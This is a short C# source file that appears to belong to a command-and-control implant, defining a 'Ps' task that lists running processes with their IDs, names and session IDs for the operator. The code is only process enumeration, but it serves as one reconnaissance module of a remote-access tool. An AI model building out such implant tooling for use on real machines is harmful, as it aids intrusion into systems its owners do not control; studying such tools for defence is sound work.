using System.Text;
using System.Diagnostics;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    class Ps : ImplantCommands
    {
        public override string Name => "Ps";

        public override string Execute(ImplantTask task)
        {

            StringBuilder _out = new StringBuilder();

            _out.AppendLine($"{"PID", -15} {"ProcName", -35} {"SessionId",-45}");
            _out.AppendLine($"{"---", -15} {"--------", -35} {"---------",-45}");

            var procs = Process.GetProcesses();

            foreach(var proc in procs){
                _out.AppendLine($"{proc.Id, -15} {proc.ProcessName, -35} {proc.SessionId, -45}");
            }

            return _out.ToString();
        }
    }
}
